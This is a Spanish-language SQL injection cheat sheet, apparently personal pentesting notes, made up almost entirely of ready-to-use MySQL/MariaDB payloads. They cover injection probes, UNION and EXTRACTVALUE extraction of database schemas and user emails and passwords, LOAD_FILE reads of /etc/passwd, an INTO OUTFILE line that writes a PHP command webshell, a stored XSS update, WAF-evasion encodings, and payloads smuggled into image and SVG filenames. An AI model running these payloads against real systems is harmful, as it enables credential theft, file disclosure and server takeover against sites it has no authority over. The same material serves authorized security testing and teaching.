# 🦕 ꧁𓊈SQL INJECTION𓊉꧂

**`⃤⃞⃟⃤`** Sondas.

```bash
# Testing rapido. El 1 representa el numero o letra despues del parametro.
1'
1"
1\
1)
1')
1%00
1%09%23
--------------------------------------------------------------------------
1' AND 1=1#
1' AND 1=2#
1' AND SLEEP(3)#
1' UNION SELECT 1#
1' ORDER BY 1#
1'OR(1)=1# 
1'||1=1#
1'AND(SLEEP(5))# 
1%09AND%09SLEEP(5)# 
1 AND 1 BETWEEN 1 AND 2#
1")) OR (("1"="1--
1') OR ('1'='1--
1" OR "1"="1"--
```
**`⃤⃞⃟⃤`** Version.
```bash
# Payloads para detectar la version.
1' UNION SELECT @@version,USER(),DATABASE()# <<< para 3 columnas
1' AND @@version LIKE '%MariaDB'#
1' UNION SELECT @@version_comment,@@version_compile_os,@@version_compile_machine# <<< para 3 columnas
```
**`⃤⃞⃟⃤`** Usuario y privilegios.
```bash
# Payloads para ver privilegios. 3 columnas.
1' UNION SELECT USER(),CURRENT_USER(),@@hostname#
1' UNION SELECT @@secure_file_priv,@@plugin_dir,@@datadir#
1' UNION SELECT @@character_set_connection,@@sql_mode,@@have_symlink#
```
**`⃤⃞⃟⃤`** Info sin UNION.
```bash
1' AND DATABASE() LIKE '%'#
1' AND USER() LIKE '%@%'#
```
**`⃤⃞⃟⃤`** Deteccion de columnas con ORDER y UNION.
```bash
# Cambiar el numero hasta la deteccion o NULL.
1' ORDER BY 5# 
1' ORDER BY 5 --%20
1' UNION SELECT NULL#
1' UNION SELECT NULL --%20
```
**`⃤⃞⃟⃤`** Deteccion de columna reflejada.
```bash
# Ejemplo para 3 columnas
-1' UNION SELECT 'test1','test2','test3'#
-1' UNION SELECT 'test1','test2','test3'--%20
```
**`⃤⃞⃟⃤`** Encoding.
```bash
'      -> %27
espacio-> %20 %09 %0a %0d
#      -> %23
--     -> %2d%2d
UNION  -> %55NION  (una letra), %2555NION (doble de una)
'      -> %2527 -> decodifica 2 veces -> '
'      -> %252527 (triple)
```
**`⃤⃞⃟⃤`** Sintaxis de extraccion.
```bash
# Nombres de las DB para 3 columnas.
-1' UNION SELECT schema_name, 2, 3 FROM information_schema.schemata#

# Tablas 3 columnas.
-1' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()#

# Para nombre especifico de DB.
-1' UNION SELECT table_name, 2, 3 FROM information_schema.tables WHERE table_schema='db_nominas'#

# Columnas de la tabla "usuarios".
-1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='usuarios'#

# Contenido de la tabla usuarios (correo y contrasena). Extrae las 5 primeras filas.
-1' UNION SELECT correo,contrasena,3 FROM usuarios LIMIT 5#

# XPath sin saber el numero de columnas.
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))#
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT schema_name FROM information_schema.schemata LIMIT 0,1)))#

# Para la primer tabla de la DB llamada "db_tienda". Para cada tabla se debe cambiar el "LIMIT" ej:(1,1 2,1 etc)
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema='db_tienda' LIMIT 0,1)))#

# Para la primer columna de la tabla "usuarios" de la DB "db_tienda".
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema='db_tienda' AND table_name='usuarios' LIMIT 0,1)))#

# Para extraer el primer contenido de las columnas "correo y contrasena" de la tabla "usuarios" y de la DB "db_tienda".
-1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(correo, 0x3a, contrasena) FROM db_tienda.usuarios LIMIT 0,1)))#

# Usado GROUP_CONCAT.
# Extrae todas las tablas (3 columnas).
-1' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database()#

# Columnas de la tabla "usuarios".
-1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_schema=database() AND table_name='usuarios'#

# Extraer datos de las columnas "correo y contrasena" de la tabla "usuarios" (5).
-1' UNION SELECT 1, GROUP_CONCAT(CONCAT(correo, 0x3a, contrasena)), 3 FROM usuarios LIMIT 5#

```
**`⃤⃞⃟⃤`** Lectura de archivos (3 columnas).
```bash
-1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3# 
-1' UNION SELECT LOAD_FILE('/var/www/html/index.php'),2,3# 
```
**`⃤⃞⃟⃤`** Permisos de escritura (webshell y xss).
```bash
# La webshell depende de la ruta y las columnas en este caso 3.
1' UNION SELECT '<?php system($_GET[0]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'# 
1'; UPDATE [TABLA] SET [COLUMNA]='<script>alert(1)</script>' WHERE id=5#
```
**`⃤⃞⃟⃤`** WAF payloads (order by 10).
```bash
# Mysql.
1%09/*!30001ORDER*/%09/*!50611BY*/%0910#
1%09/*!50611ORDER*/%09/*!40100BY*/%0910#
1%09/*!30001ORDER*/%09/*!50611BY*/%09310#
1%09/*!50708ORDER*/%09/*!30001BY*/%09410#
1%09/*!50708ORDER*/%09/*!40100BY*/%09510#
1%0AorDER%0Aby%0A10%23
1/**/ORDER/**/BY/**/10#
------------------------------------------------------
# MariaDB.
1%09/*M!30001ORDER*/%09/*M!50611BY*/%0910# 
1%09/*M!50611ORDER*/%09/*M!40100BY*/%0910# 
1%09/*M!30001ORDER*/%09/*M!50611BY*/%0910#
1%09/*M!50708ORDER*/%09/*M!30001BY*/%0910# 
1%09/*M!50708ORDER*/%09/*M!40100BY*/%0910#
```
**`⃤⃞⃟⃤`** WAF payloads (Union select 3 columnas).
```bash
# Tablas
-1%09/*!80000UNION*/%09ALL%09/*!40100SELECT*/%09/*!80000NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(table_name)%09/*!30001FROM*/%09information_schema.tables%09/*!80000WHERE*/%09table_schema=DATABASE()),/*!80000NULL*/#
-1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema%3DDATABASE())%2Cnull%23
-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(table_name)/**/FR/**/OM/**/informati/**/on_schema.tables/**/WH/**/ERE/**/table_schema=DATABASE()),NULL#
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Columnas de la tabla "users" en hexadecimal.
-1%09/*!80000UNION*/%09ALL%09/*!50708SELECT*/%09/*!40100NULL*/,(/*!50708SELECT*/%09GROUP_CONCAT(column_name)%09/*!80000FROM*/%09information_schema.columns%09/*!80000WHERE*/%09table_name=0x7573657273),/*!40100NULL*/#
-1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name%3D0x7573657273)%2Cnull%23
-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(column_name)/**/FR/**/OM/**/informati/**/on_schema.columns/**/WH/**/ERE/**/table_name=0x7573657273),NULL#
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Datos de las columnas "email y pass" de la tabla "users".
-1%09/*!50611UNION*/%09ALL%09/*!40100SELECT*/%09/*!40100NULL*/,(/*!40100SELECT*/%09GROUP_CONCAT(CONCAT_WS(0x3a,email,pass)%09SEPARATOR%090x7c)%09/*!50708FROM*/%09users),/*!40100NULL*/#
-1%0Aunion%0AALL%0Aselect%0Anull%2C(select%0Agroup_concat(concat_WS(0x3a%2Cemail%2Cpass)%0ASEPARATor%0A0x7c)%0Afrom%0Ausers)%2Cnull%2Cnull%23
-1/**/UN/**/ION/**/ALL/**/SEL/**/ECT/**/NULL,(SEL/**/ECT/**/GROUP_/**/CONCAT(CONC/**/AT_WS(0x3a,email,pass)/**/SEPARATOR/**/0x7c)/**/FR/**/OM/**/users),NULL,NULL#
```
**`⃤⃞⃟⃤`** Payloads en nombre de imagen.
```bash
imagen.jpg' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x)-- -.jpg
imagen.png' AND 1=2-- -.png
imagen.jpg' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -.jpg
imagen.png') AND (SELECT 5543 FROM (SELECT(SLEEP(5)))x) AND ('a'='a-- -.png
--sleep(15).png
a';select+sleep(10);--z.png
----------------------------------------------------------------------------
# Svg
<svg xmlns="http://w3.org">
  <![CDATA[' AND (SELECT 1 FROM (SELECT(SLEEP(10)))x)-- -]]>
</svg>

<svg xmlns="http://w3.org">
  <g id="-1&apos; AND (SELECT 1 FROM (SELECT(SLEEP(10)))x)-- -"></g>
</svg>
```


